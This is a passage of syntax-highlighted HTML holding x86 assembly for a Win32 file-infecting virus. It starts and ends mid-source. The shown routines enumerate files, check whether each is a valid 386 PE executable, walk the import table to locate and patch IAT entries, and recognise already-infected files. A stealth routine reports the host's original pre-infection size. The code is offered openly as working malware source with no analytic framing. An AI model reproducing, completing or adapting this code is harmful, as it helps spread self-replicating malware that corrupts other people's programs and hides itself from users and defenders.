</span><span class="sc5">IT_nup</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Get_DLL_Name</span><span class="sc0">            </span><span class="sc1">;namez dont match, get next import descriptor</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Next_char_from_DLL</span><span class="sc0">

</span><span class="sc5">Found_DLL_name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;we got the import descriptor containin specified module name</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">esi.ID_ForwarderChain</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;store pointer to ForwarderChain field for later use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;store pointer to import descriptor for later use</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Pushad_ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">K32Mod</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddressET</span><span class="sc0">                </span><span class="sc1">;scan export table of specified module handle</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;and get function adress of specified API</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;This is needed just in case the API function adressez are bound in the IAT</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">            </span><span class="sc1">;if not found then go, this value cant be zero or the IAT wont be patched</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddrIAT</span><span class="sc0">                  </span><span class="sc1">;inspect first thunk (which later will be patched by the loader)</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IAT_found</span><span class="sc0">                       </span><span class="sc1">;if found then jump (save it and go)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.ID_OriginalFirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get original thunk (which later will hold the original unpatched IAT)</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">End_GetProcAddressIT</span><span class="sc0">            </span><span class="sc1">;if not found then go, this value could be zero</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAddrIAT</span><span class="sc0">                  </span><span class="sc1">;inspect original thunk</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IAT_found</span><span class="sc0">                       </span><span class="sc1">;jump if not found</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">;we got the pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ID_FirstThunk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">x</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;convert it to RVA</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">6Bh</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">    </span><span class="sc1">;imul   esi,[ebx],-0C0h ;i like bizarre thingz =8P</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">End_GetProcAddressIT</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">;xor eax,eax   ;error, adress not found</span><span class="sc0">

</span><span class="sc5">IAT_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save IAT entry pointer</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">                </span><span class="sc1">;jump and unwind parameterz in stack</span><span class="sc0">

</span><span class="sc5">findfirst</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;this function is just a wraper to the FindFistFileA API..</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindData</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                                     </span><span class="sc1">;args for findfirst</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;args for findfirst</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ddFindFirstFileA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;call FindFirstFileA API</span><span class="sc0">

</span><span class="sc5">end_findfirst</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">get_size</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;this function retrieves the file size and discards</span><span class="sc0">
                </span><span class="sc1">;  huge filez, it also sets some parameterz for l8r use</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EBX = pointer to WIN32_FIND_DATA structure</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EAX = file size</span><span class="sc0">
                </span><span class="sc1">;  ESI = pointer to filename</span><span class="sc0">
                </span><span class="sc1">;  Carry clear: file ok</span><span class="sc0">
                </span><span class="sc1">;  Carry set: file too large</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">get_size_ret</span><span class="sc0">                    </span><span class="sc1">;discard directory entriez</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeHigh</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">     </span><span class="sc1">;discard huge filez, well if any thaat big (&gt;4GB)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">65h</span><span class="sc0">                          </span><span class="sc1">;load size padin value</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PathName</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;get pointer to filename</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get file size</span><span class="sc0">
        
</span><span class="sc5">get_size_ret</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetProcAddrIAT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;this function scans the IMAGE_THUNK_DATA array of "dwords"</span><span class="sc0">
                </span><span class="sc1">;  from the selected IMAGE_IMPORT_DESCRIPTOR, searchin for</span><span class="sc0">
                </span><span class="sc1">;  the selected API name. This function works for both</span><span class="sc0">
                </span><span class="sc1">;  bound and unbound import descriptorz. This function is</span><span class="sc0">
                </span><span class="sc1">;  called from inside GetProcAddressIT.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EBX = RAW start pointer of import section</span><span class="sc0">
                </span><span class="sc1">;  ECX = RVA pointer to IMAGE_THUNK_ARRAY</span><span class="sc0">
                </span><span class="sc1">;  EDX = RVA start pointer of import section</span><span class="sc0">
                </span><span class="sc1">;  EDI = pointer selected API function name.</span><span class="sc0">
                </span><span class="sc1">;  EBP = RAW size of import section</span><span class="sc0">
                </span><span class="sc1">;  TOS+04h (Arg1): real address of API function inside selected</span><span class="sc0">
                </span><span class="sc1">;                  module (in case the descriptor is unbound).</span><span class="sc0">
                </span><span class="sc1">;  TOS+00h (return adress)</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  EAX = RVA pointer to IAT entry</span><span class="sc0">
                </span><span class="sc1">;  EAX = 0, if not found</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">IT_not_found</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get RAW pointer to IMAGE_THUNK_DATA array</span><span class="sc0">

</span><span class="sc5">next_thunk_dword</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;get dword value</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;end of IMAGE_THUNK_DATA array?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">IT_not_found</span><span class="sc0">

</span><span class="sc5">no_ordinal</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;convert dword to a RAW pointer</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">;dword belongs to an unbound image descriptor?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">IT_search</span><span class="sc0">               </span><span class="sc1">;no, jump</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;yea, we have the API adress itself, reconvert to RVA</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">2</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.Arg1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;API adressez match?</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">IT_found?</span><span class="sc0">               </span><span class="sc1">;yea, we found it, jump</span><span class="sc0">

</span><span class="sc5">IT_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;image descriptor contains imports by name</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">eax.IBN_Name</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get API name from import descriptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">esp.</span><span class="sc4">(</span><span class="sc2">5</span><span class="sc4">*</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc5">.cPushad.Arg2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get API name selected as a parameter</span><span class="sc0">

</span><span class="sc5">IT_next_char</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;find requested API from all imported API namez..</span><span class="sc0">

        </span><span class="sc6">cmpsb</span><span class="sc0">                   </span><span class="sc1">;do APIz match?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IT_new_search</span><span class="sc0">   </span><span class="sc1">;no, continue searchin</span><span class="sc0">

</span><span class="sc5">IT_Matched_char</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">IT_next_char</span><span class="sc0">

</span><span class="sc5">IT_new_search</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;yea, they match, we found it</span><span class="sc0">
        
</span><span class="sc5">IT_found?</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">next_thunk_dword</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get the pointer to the new IAT entry</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;convert it to RVA</span><span class="sc0">

</span><span class="sc5">IT_not_found</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Pshd</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">GetProcAddressIT</span><span class="sc0">        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">check_PE_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function opens, memory-maps a file and checks</span><span class="sc0">
                </span><span class="sc1">;  if its a PE file</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  EBX = pointer to WIN32_FIND_DATA structure</span><span class="sc0">
                </span><span class="sc1">;  ESI = pointer to filename</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  ESI = 0, file already infected or not infectable</span><span class="sc0">
                </span><span class="sc1">;  ESI != 0, file not infected</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Open</span><span class="sc4">&amp;</span><span class="sc5">MapFile</span><span class="sc0">                    </span><span class="sc1">;open and memory-map the file</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">end_PE_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get file size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">                      </span><span class="sc1">;file too short?</span><span class="sc0">

</span><span class="sc5">Check_PE_sign</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">;this function checks validity of a PE file.</span><span class="sc0">
                </span><span class="sc1">;on entry:</span><span class="sc0">
                </span><span class="sc1">;  ECX = base address of memory-maped file</span><span class="sc0">
                </span><span class="sc1">;  EBX = pointer to WIN32_FIND_DATA structure</span><span class="sc0">
                </span><span class="sc1">;  EAX = host file size - 80h</span><span class="sc0">
                </span><span class="sc1">;on exit:</span><span class="sc0">
                </span><span class="sc1">;  ESI = 0, file already infected or not infectable</span><span class="sc0">
                </span><span class="sc1">;  ESI != 0, file not infected          </span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc5">IMAGE_DOS_SIGNATURE</span><span class="sc0">      </span><span class="sc1">;needs MZ signature</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">ecx.MZ_lfanew</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get ptr to new exe format</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">;ptr out of range?</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc5">IMAGE_NT_SIGNATURE</span><span class="sc0">      </span><span class="sc1">;check PE signature</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_Machine</span><span class="sc4">],</span><span class="sc0"> \      </span><span class="sc1">;must be 386+ machine</span><span class="sc0">
                </span><span class="sc5">IMAGE_FILE_MACHINE_I386</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_FileHeader.FH_Characteristics</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">IMAGE_FILE_EXECUTABLE_IMAGE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> \     </span><span class="sc1">;must have the executable bit but cant be a DLL</span><span class="sc0">
                   </span><span class="sc5">IMAGE_FILE_DLL</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Close_File</span><span class="sc0">
        
        </span><span class="sc1">;at this point, calculate virus checksum to make sure file is really</span><span class="sc0">
        </span><span class="sc1">;infected. If its infected then return original size of host previous</span><span class="sc0">
        </span><span class="sc1">;to infection and store it in the WIN32_FIND_DATA structure (stealth).</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.NT_OptionalHeader.OH_CheckSum</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get checksum field</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Dh</span><span class="sc0">          </span><span class="sc1">;calculate virus checksum to make sure file is really infected</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">edi.NT_FileHeader.FH_TimeDateStamp.hiw.hib</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.NT_OptionalHeader.OH_CheckSum.hiw</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11111100b</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">uni_or_ansi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">go_esi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B2FD26A3h</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">68000000h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.NT_FileHeader.FH_TimeDateStamp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03FFFFFFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">go_esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ebx.WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">;return original file size</span><span class="sc0">
</span><span class="sc5">go_esi</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">;set "already infected" mark</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">&amp;</span><span class="sc5">UnmapFile</span><span class="sc0">         </span><span class="sc1">;close and unmaps file</span><span class="sc0">

</span><span class="sc5">end_PE_file</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">pop_ebp</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;get the ebp_num value needed to access variablez thru EBP</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc9">if</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">ebp_num</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">m_ebp</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ebp_num</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">m_ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc9">endif</span><span class="sc0">
